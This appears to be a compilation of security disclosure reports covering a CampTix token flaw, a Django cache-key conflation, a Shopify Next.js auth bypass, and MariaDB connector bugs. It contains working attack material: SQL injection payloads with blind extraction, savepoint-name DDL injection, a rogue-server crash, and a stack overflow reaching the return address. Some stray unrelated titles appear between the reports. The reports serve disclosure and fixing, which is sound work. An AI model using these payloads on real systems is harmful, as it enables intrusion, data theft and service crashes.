   ```
   The real ticket holder's cookie no longer matches, so on their next visit they are told
   "Looks like you logged in from a different computer. Please log in again."

## Recommendations

The token must be unguessable by the person requesting it, and requesting it must prove control of
the inbox:

1. Generate the token from `wp_generate_password( 32, false )` (or `wp_generate_uuid4()`) and store
   it; never derive it from data the requester supplies.
2. Mail the resulting link to the address instead of unlocking the content in the same response. The
   confirmation mail is the ownership proof that is missing today.
3. Add a nonce to the form and rate-limit submissions per IP, so the handler cannot be driven as an
   oracle for which addresses hold tickets.
4. Do not overwrite `tix_view_token` for every attendee sharing the address on each submission —
   issue per-session tokens, so one request cannot evict an existing holder.

Point 2 alone closes the disclosure. Point 4 is what stops the denial of access to the real holder.

DISCLOSURE

I will refrain from sharing information about this issue for 120 calendar days after your
acknowledgement of receipt, per your vulnerability disclosure policy.

## Impact

Anyone who knows an attendee's e-mail address reads content a WordCamp organiser restricted to ticket
holders — attendee-only schedules, venue or access details, private video links, sponsor material,
after-party or accommodation information. No account, no ticket, no cookie, no nonce: one POST.

The e-mail address is the only thing the check really asks for, and it is routinely obtainable. It
appears on speaker and sponsor pages, in public mailing lists and in forwarded confirmation mails, and
for most organisations it follows a predictable format. The handler also answers differently for an
address that has a ticket and one that does not, so it doubles as an oracle for "did this person
attend", which is itself information the attendee did not publish.

The same request takes access away from the person who paid for it. It overwrites `tix_view_token`
on every attendee record sharing that address, so the legitimate holder's cookie stops matching and
they are told they "logged in from a different computer". An attacker who repeats the request keeps
them locked out indefinitely, and the plugin records only the attacker's IP against the attendee.

Limits, stated plainly:

* **The camp must use `[camptix_private]`.** The shortcode is an optional CampTix addon that an
  organiser places on a page. Sites that never use it are unaffected, and I did not survey how many
  WordCamp sites do — this is why I have scored `AT:P`.
* **The attacker must know or guess a real attendee address.** Control B in the transcript shows an
  address with no attendee record discloses nothing.
* **Only the gated block is disclosed.** Ticket records, payment data and the attendee list itself
  are not returned by this path.
* **Verified on a local install of CampTix 2.0.0**, not against a production WordCamp site. I did not
  test this against anyone's real event, because doing so would mean reading content gated for real
  attendees using a real person's address.

`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N` = **6.3 Medium**.
`AT:P` because the vulnerable path exists only where the shortcode is deployed. `VI:L` for the token
overwrite that evicts the legitimate holder. Scored without the shortcode precondition (`AT:N`) it
would be 6.9; I have taken the lower reading.

title: `monero-wallet-rpc::rescan_spent` accepts daemon-supplied spent-status from an untrusted daemon, enabling ring-intersection attack on transactions
Re-entrant curl_easy_pause UAF in cw-pause
`Vary` cache-key conflation of absent and empty request fields
vulnerability_information:
`UpdateCacheMiddleware` / `CacheMiddleware` generates the same page-cache key when a request header nominated by `Vary` is absent and when it is present with an empty field value. This can cause a response selected for one request to be returned for the other.

RFC 9111 §4.1 says that an absent nominated request field can match only another request in which that field is also absent. HTTP field-value grammar permits an empty field value.



steps to reproduce

Use the included local-only PoC:

```sh
PYTHONPATH=/path/to/django-6.1.1 python poc_django_vary_missing_empty.py
```

It sets up a view where presence of `X-Scope` selects a `PRIVATE` response and the response declares `Vary: X-Scope`.

1. `GET /account` with `X-Scope:` stores `PRIVATE`.
2. `GET /account` with no `X-Scope` field returns `PRIVATE` from cache.
3. The view invocation counter is `1`, proving the second response was a cache hit.

Observed output:

```text
first=PRIVATE second=PRIVATE view_calls=1
VULNERABLE: missing and empty varied headers were treated as one cache key
```

I also verified Django’s ASGI request adapter preserves the present-but-empty field as `META["HTTP_X_SCOPE"] == ""`; the collapse happens in the cache-key generator.

## Impact

An application that correctly uses `Vary` to separate representations based on a header’s presence can have a representation cached for a request with an empty header served to a request without that header, or vice versa. If either representation contains data intended only for the other request state, this is private-response disclosure through Django’s origin cache.

The attacker capability is only to send an empty request header and to cause/request cache population; no secret-key knowledge, raw SQL, or special deployment component is needed.

title: Unauthenticated access to Checkout Blocks employee-only endpoints exposed merchant metadata
vulnerability_information:
## Summary:

`checkout-blocks.shopifyapps.com` has staff pages at `/internal` and `/api/internal/`. Ask for one without an employee session and you get redirected to `minerva.shopifycloud.com`, your employee login. That redirect is the only thing protecting them.

The rule matches on the text of the URL. This app runs on Next.js, which serves every page at a second URL too: `/_next/data/<buildId>/<route>.json`. That does not start with `/internal`, so the rule ignores it, and Next.js hands the request to the same code.

Those pages then answer 200 and JSON to a request with no cookie and no authorization header. All four staff routes behave this way. The build id is not a secret either; it is printed in the public `/login` page.

## Shops Used to Test:

████████. I did not contact any other merchant's store.

## Steps To Reproduce:

Run the attached `poc.sh`. No arguments, no credentials.

```
1 normal  /api/internal/shops      -> 302  https://minerva.shopifycloud.com/auth/minerva?...
2 bypass  /_next/data/ID/..shops   -> 200  628 bytes  application/json
3 ghost   /_next/data/NOPE/..      -> 404  (expect 404)
4 control /_next/data/ID/..admin   -> 302  .../login  (expect 302 login)
5 last page  -> {'total': 201520, 'pages': 40304, 'current': 40298} | shops returned: 5
```

Line 1 is the gate working, line 2 the same endpoint answering an anonymous client. Line 3 shows the second URL is not a catch all. Line 4 makes this a bypass rather than a public endpoint: at the same URL style, a route that checks its own session still refuses. Line 5 reaches page 40298 of 40304, and `total` is your server's own number.

Two things that make a re-test look like a false negative. The build id changes on every deploy, so a stale one returns 404 and looks fixed; read it from `/login` at run time as the script does. And test something under `/api/internal/`, because `/api/admin/` is protected properly and will look like the boundary holding.

## Remediation

Check the session in the route's own code, as `/api/admin/*` on this server already does at that same URL style. A rule at the edge matching the start of a URL cannot see a framework rewrite. If it stays at the edge, cover `/_next/data/<buildId>/api/internal/*` too.

## Attached

`poc.sh`. Run with `bash poc.sh`. {F6507558}

## Impact

## Summary:
Anyone on the internet, with no Shopify account and without anyone clicking anything, accesses a console you protect with employee login.

What comes back is the app's merchant install list, which your server reports as 201,520 records across 40,304 pages, each with the shop domain, an internal shop id and the install date. It also returns which merchants have internal flags turned on, including `checkout_blocks_allow_plus_features` and `allowPaidUpgrade`. It includes non public staging stores belonging to identifiable brands, and it is live: the count rose four times while I tested.

I stopped deliberately. Every record in that list belongs to a merchant I have no relationship with, so the questions that would establish the real ceiling, how much can be pulled, whether anything can be written, what the other staff pages hold, all need handling of data that is not mine. I would rather send an under explored report than over explore other people's data.

For that same reason I am not proposing a severity and have left the field empty. Please rate it on what is actually reachable from this bypass, not on the little I was willing to demonstrate.

summaries.author: tod_shopify
summaries.content:
Missing authentication allowed unauthenticated visitors to access employee-only Checkout Blocks tools and see which stores had installed the app, when they installed it, and which features were enabled for them. Further internal review discovered that attackers could also turn Checkout Blocks features on or off for stores without permission. 

Shopify added verified employee authentication, and production checks confirmed the anonymous bypass was blocked. The fix protects both the internal store information and the tools used to change store features.

title: Connector/C++ string escaper re-escapes its own output, enabling SQL injection

asset.asset_identifier: MariaDB Server & Connectors - Data corruption, exfiltration, disclosure

vulnerability_information:
Utils::escapeString is the escaper behind every identifier and literal that MariaDbDatabaseMetaData interpolates into the information_schema queries it builds. It is implemented on top of sql::mariadb::replace, whose inner loop advances its search cursor by the length of the substitution instead of to the end of the substitution it just made. It therefore finds and re-escapes the characters it has itself inserted, emitting a run whose length depends on where the character sat in the input. For backslash doubling that run is frequently odd, which leaves one live escape character that consumes the closing quote of the literal. An application that passes an untrusted table, schema, or column name to a DatabaseMetaData method gets SQL injection.

## Details

The defect is in src/util/String.cpp:64-76:

```cpp
  SQLString& replaceInternal(SQLString& str, const SQLString& _substr, const SQLString &subst)
  {
    size_t pos= 0, prev= 0;
    ...
    while ((pos= real.find(substr, prev)) != std::string::npos)
    {
      real.replace(pos, substr.length(), realSub);
      prev+= realSub.length();
    }
```

prev must become pos + realSub.length(). Instead it accumulates realSub.length() from zero, so after replacing a character at position p the next search starts at 2, 4, 6 and so on, which is behind p. The loop re-finds the inserted substitution and replaces it again, repeating until prev passes the run. One input character therefore becomes roughly p+1 output characters.

Utils::escapeString (src/util/Utils.cpp:66-81) uses that helper for both of its passes:

```cpp
    SQLString escaped= replace(value, "'", "''");
    if (noBackslashEscapes){
      return escaped;
    }
    return replace(escaped, "\\", "\\\\");
```

Quote doubling always produces an even count, so it survives the multiplication. Backslash doubling does not: a single backslash at index 5 comes out as seven backslashes, an odd run, and the trailing one escapes the quote that follows.

There is a second, independent defect on the same path. Three sibling helpers in MariaDbDatabaseMetaData.cpp escape metadata arguments, and they do not agree:

```cpp
:526  return "'" + Utils::escapeString(value, connection->getProtocol()->noBackslashEscapes()) + "'";
:570  return "("+columnName +" "+predicate +" '" + Utils::escapeString(tableName,true)+"')";
:580  return "(" + columnName + " " + predicate + " '" + Utils::escapeString(schemaName, true) + "')";
```

escapeQuote at :526 passes the live server flag. patternCond at :570 and schemaPatternCond at :580 hardcode true, which tells the escaper that backslash is not an escape character. Against a server whose sql_mode does not contain NO_BACKSLASH_ESCAPES, which is the default, backslash is an escape character, so those two helpers never escape it at all.

Either defect alone is enough to break out. This was measured rather than assumed: a search over 336 payload shapes was run against four builds.

```bash
[STOCK HEAD c57f17f      ] payload shapes tried=336  injecting shapes=42
[fix A only (escape flag)] payload shapes tried=336  injecting shapes=36
[fix B only (replaceInt.)] payload shapes tried=336  injecting shapes=0
[fix A + fix B           ] payload shapes tried=336  injecting shapes=0
```

Correcting only the hardcoded flag leaves 36 working payload shapes, because the backslash doubling it enables is still multiplied into an odd run. Correcting replaceInternal closed every shape tried. Both should be fixed, and the durable fix is to route these through mysql_real_escape_string the way CONCPP-153 did for parameter values.

The reachable surface is the whole metadata layer. patternCond and schemaPatternCond are used by getTables, getColumns, getPrimaryKeys, getProcedures, getProcedureColumns, getFunctions, getFunctionColumns, getColumnPrivileges and getTablePrivileges. escapeQuote, which shares the broken replace, feeds a further fourteen catalogCond call sites. MariaDbConnection::quoteIdentifier (:85-87) and the public MariaDbStatement::enquoteIdentifier (:375) are built on the same replace, so the driver's own identifier-quoting API is affected too.

## PoC

1. Start MariaDB 11.4 with default sql_mode. Create schema pocdb with tables alpha and zsecret, and schema otherdb with table alpha.

2. Have the application call getTables asking only for the single table "alpha". Benign control:

```bash
=== BENIGN CONTROL: tableNamePattern = "alpha" ===
        row: pocdb.alpha
    [benign] rows=1
```

3. Pass an untrusted name instead. tableNamePattern = alpha\' OR 1=1 OR TABLE_NAME LIKE ' The driver emits, as captured from the server general log:

```bash
WHERE (TABLE_SCHEMA = 'pocdb') AND (TABLE_NAME LIKE 'alpha\'''''''' OR 1=1 OR TABLE_NAME LIKE '''''''''''''''''''''''''''''')
```

   The backslash consumes the first quote, three pairs become literal quotes, the seventh closes the literal, and OR 1=1 lands in code position:

```bash
=== POSITIVE 1: literal breakout, force the predicate true ===
        row: pocdb.alpha
        row: pocdb.zsecret
    [OR 1=1] rows=2
```

   zsecret is returned although the application asked only for alpha.

4. Inject through schemaPattern instead and the schema restriction is bypassed, returning a table from a different database:

```bash
=== POSITIVE 2: cross-schema, inject via schemaPattern ===
        row: otherdb.alpha
        row: pocdb.alpha
    [schema OR 1=1] rows=2
```

5. The same breakout supports a subquery, which gives a boolean oracle and byte-by-byte extraction. The application still only ever asks for table alpha:

```bash
  control: 1=1                        rows=2  TRUE
  control: 1=2                        rows=0  FALSE
  mysql.user count > 100              rows=0  FALSE
  mysql.user count > 0                rows=2  TRUE
  @@version starts with '1' (0x31)    rows=2  TRUE
  @@version starts with '9' (0x39)    rows=0  FALSE

Byte-by-byte extraction of @@version via the same oracle:
  recovered @@version prefix = "11?4?1"
```

   The two ? are '.' characters, which sit below the 0x30 floor of the scan loop.

6. Negative control. Correcting replaceInternal (poc/fix/F2_rootcause_fix.diff) and re-running the same 336 payload shapes yields zero injecting shapes, and the same payloads now emit a correctly escaped literal.

Scenario A (sanity): 
getTables(schema=pocdb, table="alpha") -> rows=1, exactly the table requested Scenario B (negative control):
replaceInternal-fixed build (poc/fix/F2_rootcause_fix.diff) -> 0 of 336 payload shapes inject Scenario C (attack):
stock HEAD -> 42 of 336 shapes inject; pocdb.zsecret returned unasked; otherdb.alpha returned across the schema restriction; @@version recovered byte by byte

Artifacts:
- poc/poc_evidence.txt, full transcript including benign and fixed controls
- poc/poc_sqli.cpp, poc/poc_exfil.cpp, poc/poc_injsearch.cpp, poc/poc_chain2.cpp
- poc/fix/F2_rootcause_fix.diff, poc/fix/F2_one_line_fix.diff, poc/fix/F2_both_fixes.diff
- Affected: src/util/String.cpp:64-76, src/util/Utils.cpp:66-81,
  src/MariaDbDatabaseMetaData.cpp:570 and :580, at HEAD c57f17f

Preconditions, stated plainly. The attacker must control a string the application hands to a DatabaseMetaData method. Applications that let a user pick a table or schema to inspect, database tooling and admin consoles, ORMs that reflect schema using a caller-supplied name, and multi-tenant services that derive a schema name from tenant input all match that shape. Applications that only ever pass compile-time constants are not affected. No non-default connection option is required, and the server needs only its default sql_mode.

## Impact

Demonstrated on a running server: rows the application did not ask for, disclosure across a database boundary that the caller explicitly restricted, and blind byte-by-byte extraction of arbitrary server-side values through a boolean oracle.

The write side follows from a separate defect reported alongside this one. Connector/C++ passes the literal CLIENT_MULTI_STATEMENTS to mysql_real_connect at ConnectProtocol.cpp:474 and discards the capability mask it computed, so stacked statements are always enabled even with allowMultiQueries left at its default of false. Chained, a getTables argument executes arbitrary additional statements. This was confirmed end to end: the statement pair below created a table.

```
WHERE (TABLE_SCHEMA = 'pocdb') AND (TABLE_NAME LIKE 'alpha\'''''''') ; CREATE TABLE pocdb.canary_c (id INT); -- ')
```

title: Connector/C++ aborts client process on server session-tracking packet via std::stoi

asset.asset_identifier: MariaDB Server & Connectors  - Denial of Service

vulnerability_information:
QueryProtocol::handleStateChange reads the session-tracking system-variable entry from an OK packet, compares it against the literal "auto_increment_increment", and then calls std::stoi on that same string. The string is the variable NAME, not its value, so whenever the branch is taken std::stoi is guaranteed to throw std::invalid_argument. sql::SQLException derives from std::runtime_error, so a std::logic_error is caught by nothing in the driver and nothing in a correctly written application. It unwinds out of main and terminates the process. Two packets from a malicious or MITM-positioned server abort the client.

## Details

src/protocol/capi/QueryProtocol.cpp:1520-1540:

```cpp
      if (mysql_session_track_get_first(connection, static_cast<enum capi::enum_session_state_type>(type), &value, &len) == 0)
      {
        std::string str(value, len);

        switch (type) {
        case StateChange::SESSION_TRACK_SYSTEM_VARIABLES:
          if (str.compare("auto_increment_increment") == 0)
          {
            autoIncrementIncrement= std::stoi(str);
```

For SESSION_TRACK_SYSTEM_VARIABLES the protocol carries a name followed by a value, and mysql_session_track_get_first returns the name. The value requires a follow-up call to mysql_session_track_get_next, which never happens. So the code has just proved str is the non-numeric literal "auto_increment_increment" and then asks std::stoi to parse it. The throw is not an edge case, it is the only possible outcome of entering the branch.

The exception type is what makes this a process abort rather than a handled error. include/conncpp/Exception.hpp:32:

```cpp
class SQLException : public ::std::runtime_error
```

std::invalid_argument derives from std::logic_error, a sibling of std::runtime_error. An application following the documented contract and catching sql::SQLException does not catch it, and neither do the driver's own catch(SQLException&) and catch(std::runtime_error&) handlers on the execute path.

The trigger is entirely server-controlled. handleStateChange is called at :1512 whenever the server sets the session-state-changed bit in the status flags:

```cpp
    if ((serverStatus & ServerStatus::SERVER_SESSION_STATE_CHANGED_)!=0) {
      handleStateChange(results);
    }
```

The client advertises session tracking as part of libmariadb's default capability set, so no non-default option is needed. A genuine server reaches this too if an administrator adds auto_increment_increment to session_track_system_variables.

## PoC

1. Run a server that completes a normal handshake advertising CLIENT_SESSION_TRACK, then answers any statement with an OK packet whose status flags include SERVER_SESSION_STATE_CHANGED and whose session_state_changes payload carries a SESSION_TRACK_SYSTEM_VARIABLES entry for auto_increment_increment:

   python3 poc/rogue_server.py --port 13742 --session-track

2. Run a client that connects with default options, executes one statement, and catches only sql::SQLException as the API documents.

3. Negative control first, with the same server and the session-tracking payload disabled:

```bash
  -- negative control: identical server, no session-track payload --
[client] completed normally
  exit=0
```

4. Positive, with the payload enabled:

```bash
  -- positive: SESSION_TRACK_SYSTEM_VARIABLES=auto_increment_increment --
terminate called after throwing an instance of 'std::invalid_argument'
  what():  stoi
  exit=134  (signal 6 = SIGABRT)
```

   The process dumps core. A client that additionally catches std::exception, which the API does not require, sees the escaped type directly:

```bash
[client] std::exception (St16invalid_argument): stoi
```

Scenario A (sanity): 
rogue server without the session-track payload -> [client] completed normally, exit=0 Scenario B (negative control):
same server, same client binary, payload disabled -> clean exit Scenario C (attack):
SESSION_TRACK_SYSTEM_VARIABLES=auto_increment_increment -> terminate called after throwing std::invalid_argument, exit=134 (SIGABRT), core dumped

Artifacts:
- poc/poc_evidence.txt
- poc/poc_sessiontrack.cpp, poc/rogue_server.py (--session-track)
- Affected: src/protocol/capi/QueryProtocol.cpp:1535, reached from :1512, at HEAD c57f17f

## Impact

A malicious or MITM-positioned server terminates the client process at will, immediately after the handshake and before the application does anything meaningful. There is no way for the application to defend itself while still honouring the documented exception contract, because the type thrown is outside that contract. For a long-running service holding a connection pool this is a remote crash of the whole process, not a failed query.

Who is affected: any application that connects to a database endpoint an attacker controls or can intercept. Default configuration, no application misuse required.

The correct fix is to fetch the value with mysql_session_track_get_next before parsing it, and to parse it with something that reports failure rather than throwing, or to wrap the conversion so only SQLException escapes. Auditing the driver for other std::stoi and std::string::at calls on server-supplied data is worthwhile, since the same escape route applies to all of them.

title: Connector/C++ ignores allowMultiQueries and injects savepoint names into SQL

asset.asset_identifier: MariaDB Server & Connectors - Data corruption, exfiltration, disclosure

vulnerability_information:
Two independent defects in statement building. ConnectProtocol::createConnection passes the literal CLIENT_MULTI_STATEMENTS to mysql_real_connect and throws away the capability mask it just computed, so stacked statements are accepted on every connection even though allowMultiQueries defaults to false and the code contains an explicit gate for it. Separately, Connection::setSavepoint and Connection::releaseSavepoint concatenate the application-supplied savepoint name into SQL with no quoting or validation at all. Together they turn a savepoint name into arbitrary statement execution.

## Details

initializeClientCapabilities computes the client flags correctly at src/protocol/capi/ConnectProtocol.cpp:183:

```cpp
    if (options->allowMultiQueries || (options->rewriteBatchedStatements)){
      capabilities|= MariaDbServerCapabilities::MULTI_STATEMENTS;
    }
```

That mask is then never handed to the connect call. At :474 the flag argument is a literal:

```cpp
    if (mysql_real_connect(connection, NULL, NULL, NULL, NULL, 0, NULL, CLIENT_MULTI_STATEMENTS) == nullptr)
```

The computed capabilities value is passed only to sslWrapper and to authenticationHandler, whose signature ignores it (:590 takes int64_t /*clientCapabilities*/). So the only client flag that reaches libmariadb is the hardcoded one. allowMultiQueries defaults to false (src/options/Options.h:71, src/options/DefaultOptions.cpp), which means an application that deliberately leaves multi-statement support off, or explicitly sets it off, still gets it.

The savepoint path has no escaping. src/MariaDbConnection.cpp:1093-1099:

```cpp
  Savepoint* MariaDbConnection::setSavepoint(const SQLString& name)
  {
    Savepoint* savepoint= new MariaDbSavepoint(name, savepointCount++);
    std::unique_ptr<Statement> st(createStatement());

    st->execute("SAVEPOINT "+savepoint->toString());
```

and :1113-1116:

```cpp
  void MariaDbConnection::releaseSavepoint(const Savepoint* savepoint)
  {
    std::unique_ptr<Statement> st(createStatement());
    st->execute("RELEASE SAVEPOINT " + savepoint->toString());
```

MariaDbSavepoint::toString (src/MariaDbSavepoint.cpp:54-58) simply appends the numeric id to the caller's name. name arrives from the public API sql::Connection::setSavepoint(const SQLString&). The driver has a quoteIdentifier helper at MariaDbConnection.cpp:85-87, and it is not used here. Connector/J backtick-quotes savepoint names.

Note that quoteIdentifier would not have been sufficient anyway: it is built on the same sql::mariadb::replace whose cursor bug is the subject of the companion report, so it emits an odd run of backticks and does not reliably quote either.

## PoC

1. Connect to a stock MariaDB 11.4 with allowMultiQueries explicitly set to false, which is also the default:

```cpp
  sql::Properties props({{"user","root"},{"password","pocpw"}});
  props["allowMultiQueries"] = "false";
```

2. Execute a stacked statement. The application asked for multi-statement support to be off:

```bash
=== F3a: stacked statement with allowMultiQueries=false ===
    server accepted the stacked statement
    canary_a exists = YES  <== multi-statement is ON
```

3. Call setSavepoint with a name containing SQL:

```cpp
  conn->setSavepoint("sp; CREATE TABLE pocdb.canary_b (id INT); -- ");
```

4. The server general log shows the exact statement the driver sent:

```bash
SAVEPOINT sp; CREATE TABLE pocdb.canary_b (id INT); -- 0
```

5. The DDL ran:

```bash
=== F3b: injection through Connection::setSavepoint(name) ===
    setSavepoint() returned normally
    canary_b exists = YES  <== DDL executed via savepoint name
```

   Confirmed independently on the server:

```bash
Tables_in_pocdb
alpha
canary_a
canary_b
canary_c
zsecret
```

6. Negative control: with a plain savepoint name the emitted statement is a normal SAVEPOINT and no extra table appears.

Scenario A (sanity): 
plain savepoint name -> a normal SAVEPOINT statement, no extra table created Scenario B (negative control):
allowMultiQueries explicitly set to false, which is also the default Scenario C (attack):
stacked statement accepted (canary_a created) and setSavepoint("sp; CREATE TABLE ...; -- ") emitted that exact pair (canary_b created)

Artifacts:
- poc/poc_evidence.txt
- poc/poc_chain.cpp, poc/poc_chain2.cpp
- Affected: src/protocol/capi/ConnectProtocol.cpp:474 and :183,
  src/MariaDbConnection.cpp:1097 and :1115, src/MariaDbSavepoint.cpp:54-58, at HEAD c57f17f

Preconditions. For the savepoint issue the application must pass an untrusted string as a savepoint name; frameworks that name nested transactions after user-visible labels, tenant identifiers or request identifiers match that shape. The multi-statement issue has no precondition at all: it applies to every connection the driver makes.

## Impact

The always-on multi-statement defect is CWE-1188 Insecure Default Initialization and is best treated as a severity amplifier: on its own it does not grant access, but it removes the single most effective containment for every injection bug in or above the driver.

Realized on a running server: arbitrary DDL executed from a savepoint name, with the created table confirmed present afterwards.

The multi-statement defect matters beyond savepoints. Any SQL injection an application has, including the metadata escaping bug reported separately, is upgraded from single-statement manipulation to arbitrary statement execution because the driver silently supplies the stacking capability. An application that audited its configuration and set allowMultiQueries=false has no way to tell from the outside that the setting does nothing.

title: Stack buffer overflow in 9 of 10 Connector/ODBC catalog functions via unbounded name

asset.asset_identifier: MariaDB Server & Connectors - Data corruption, exfiltration, disclosure

vulnerability_information:
Nine of the ten catalog functions in MariaDB Connector/ODBC escape an application-supplied identifier into a fixed 513-byte stack buffer without checking its length. Any name longer than 256 bytes overflows that buffer with attacker-controlled bytes. `SQLColumns`, `SQLPrimaryKeys`, `SQLStatistics`, `SQLSpecialColumns`, `SQLProcedures`, `SQLProcedureColumns`, `SQLColumnPrivileges`, `SQLTablePrivileges` and `SQLForeignKeys` are affected. `SQLTables` is the only one that validates the length, and it rejects the identical input with `HY090`, which is what makes this an inconsistency rather than a design decision.

Reproduced on the released `odbc-mariadb 3.2.6-1.1` package as shipped by Debian and Ubuntu, and on current `master` HEAD `4e175d9` (3.2.10).

## Details

`AddPvCondition()` and `AddOaCondition()` build the WHERE conditions of the driver-generated catalog queries. Both exist in a stream variant and a buffer variant, and all four declare the same destination buffer, at `driver/ma_catalog.cpp:35`, `:53`, `:108` and `:131`:

```c
static int AddPvCondition(MADB_Dbc *dbc, void* buffer, size_t bufferLen, char* value, SQLSMALLINT len)
{
  char escaped[2*NAME_LEN + 1];
  /* We should probably compare to SQL_NTS, and throw error if just < 0, but I think this way it will work just fine */
  if (len < 0)
  {
    len= (SQLSMALLINT)strlen(value);
  }

  len= (SQLSMALLINT)mysql_real_escape_string(dbc->mariadb, escaped, value, len);
```

`NAME_LEN` is 256, so `escaped` is 513 bytes. That size is only correct if `len` is bounded by `NAME_LEN`, because `mysql_real_escape_string()` writes up to `2 * len + 1` bytes. Nothing bounds `len`. It arrives from the application through `AddPvOrIdCondition()` and `AddOaOrIdCondition()` (`:192`, `:227`), which pass the caller's `NameLength` through untouched whenever `SQL_ATTR_METADATA_ID` holds its default value of `SQL_FALSE`.

The path from the public API is direct. `MADB_StmtColumns()` hands the application's `TableName` and `NameLength3` to `AddPvOrIdCondition()` at `driver/ma_catalog.cpp:666`, and `MA_SQLColumns()` reaches it from `SQLColumns` with no validation in between. A 1000-byte name produces a 2001-byte write into a 513-byte stack buffer. The overflow is contiguous, runs off the end of the enclosing frame, and its content is the escaped form of the caller's string.

The intent is documented by the codebase itself. `MADB_StmtTables()` performs exactly this check before doing any of the work, at `driver/ma_catalog.cpp:376-378`:

```c
  /* TODO: Here we need compare character length in fact. Comparing with both either NAME_CHAR_LEN or NAME_LEN don't make quite sense, but
     if > NAME_LEN, then it is for sure too big */
  if (CatalogNameLength > NAME_LEN || TableNameLength > NAME_LEN)
```

That check exists in one of the ten catalog functions. The other nine call the same helpers with the same kind of argument and never perform it.

Passing `SQL_NTS`, which is what most applications do rather than measuring the string themselves, does not help: the `len < 0` branch recomputes the length with `strlen()` and the same overflow follows.

Observed behaviour on the stock `odbc-mariadb 3.2.6-1.1` shared object, varying only the identifier length:

```bash
  namelen=250  exit=0
  namelen=256  exit=0
  namelen=257  exit=0
  namelen=260  exit=0
  namelen=300  exit=134   *** stack smashing detected ***: terminated
  namelen=400  exit=139   SIGSEGV
```

With the driver built from `master` under AddressSanitizer, the write is attributed precisely:

```bash
==15368==ERROR: AddressSanitizer: stack-buffer-overflow
WRITE of size 1
    #0 mysql_cset_escape_slashes libmariadb/ma_charset.c:1212
    #1 mysql_real_escape_string libmariadb/mariadb_lib.c:4338
    #2 AddPvCondition driver/ma_catalog.cpp:60
    #3 AddPvOrIdCondition driver/ma_catalog.cpp:204
    #4 MADB_StmtColumns driver/ma_catalog.cpp:666
    #5 MA_SQLColumns driver/ma_api_internal.cpp:584
    #6 SQLColumns driver/odbc_3_api.cpp:299

Address is located in stack of thread T0 at offset 561 in frame AddPvCondition
  This frame has 1 object(s):
    [48, 561) 'escaped' (line 53) <== Memory access at offset 561 overflows this variable
```

The same 1000-byte name given to `SQLTables` is rejected cleanly on the same driver:

```bash
    SQLSTATE=HY090 : [ma-3.2.6][11.4.12-MariaDB-ubu2404]Table and catalog names are limited to 64 chars
```

How far this goes depends on how the driver was compiled, and the two cases differ enough to state separately.

The Debian and Ubuntu package is built with `-fstack-protector-strong`. `nm -D` on it shows a `__stack_chk_fail` reference, and at 300 bytes the canary catches the smash and the process aborts with `*** stack smashing detected ***`. At 400 bytes and above it segfaults before reaching the canary check.

The project's own `CMakeLists.txt` does not add `-fstack-protector`, so a default build from upstream source produces a shared object with no `__stack_chk_fail` symbol at all. On that build, filling the name with a chosen byte places that byte on the saved return address. With 1400 bytes of `a` passed to `SQLPrimaryKeys`:

```bash
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7cb585d in AddOaCondition (...) at driver/ma_catalog.cpp:161
161	}
#0  0x00007ffff7cb585d in AddOaCondition (...) at driver/ma_catalog.cpp:161
#1  0x6161616161616161 in ?? ()
#2  0x6161616161616161 in ?? ()
#3  0x6161616161616161 in ?? ()
```

The fault is at the closing brace of `AddOaCondition`, that is at its `ret`. Filling the name with `'` instead yields `0x275c275c275c275c`, the escaped form `\'` repeated, and passes an attacker-controlled pointer to `realloc()`.

Fixed control: adding the bound that `MADB_StmtTables` already applies, at the four escape sites, makes every input above return `SQL_SUCCESS` and exit cleanly.

```c
  if (len > NAME_LEN) len= NAME_LEN;
  len= (SQLSMALLINT)mysql_real_escape_string(dbc->mariadb, escaped, value, len);
```

## PoC

`repro_f1_catalog_overflow.c` in the attachment is a single self-contained file. It runs `SQLTables` and `SQLColumns` with the same identifier so the difference between the guarded and the unguarded function is visible in one run. No custom driver build is needed; the distribution package reproduces it.

1. Install the packaged driver, for example `apt install odbc-mariadb unixodbc unixodbc-dev`, and start any MariaDB server. 2. Build the reproducer: `gcc -O0 -g -o repro_f1 repro_f1_catalog_overflow.c -lodbc` 3. Run the control with a 200-byte identifier: `./repro_f1 "DRIVER=/usr/lib/x86_64-linux-gnu/odbc/libmaodbc.so;SERVER=127.0.0.1;PORT=3306;UID=user;PWD=pass;DATABASE=test;SSLVERIFY=0;" 200`. Both calls return `SQL_SUCCESS` and the process exits 0. 4. Run it again with the last argument changed to 1000. `SQLTables` returns `HY090` and `SQLColumns` kills the process, either with `*** stack smashing detected ***` or with SIGSEGV depending on how the driver was compiled. 5. To see the write attributed to source, rebuild the driver from `master` with `cmake .. -DCMAKE_C_FLAGS="-fsanitize=address -g" -DCMAKE_CXX_FLAGS="-fsanitize=address -g" -DWITH_SSL=OPENSSL -DWITH_EXTERNAL_ZLIB=OFF -DWITH_UNIT_TESTS=OFF && make` and point the connection string at the resulting `libmaodbc.so`. 6. To see the saved return address take the caller's bytes, build the driver from `master` with default flags and run `./repro_f1 "<connstring>" 1400 a` under gdb. 7. Fixed control: apply the one-line clamp at the four escape sites in `ma_catalog.cpp`, rebuild, and repeat steps 4 through 6. All of them return `SQL_SUCCESS`.

CVSS 3.1: AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H = 8.1 for a build without a stack canary, which is what the project's own CMakeLists produces. For the hardened distribution builds, where the canary converts the overflow into a controlled abort, AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H = 5.9 is the accurate reading. AC:H in both reflects that the attacker needs a calling application that routes untrusted input into a catalog function.

Suggested fix: reject or clamp identifiers longer than `NAME_LEN` before escaping them, the same way `MADB_StmtTables` already does. Adding `-fstack-protector-strong` to the project's own build flags would be worthwhile independently.

## Impact

Memory corruption in the process that loads the driver, triggered by the length of an identifier the application passes to a catalog function.

On the hardened distribution builds the demonstrated result is a reliable, remotely reachable abort or segfault, so any application that can be induced to pass a long identifier can be killed. On a driver built from upstream source with the project's own default flags there is no stack canary, and the saved return address holds bytes the caller chose, which is the precondition for control-flow hijack rather than a crash alone.

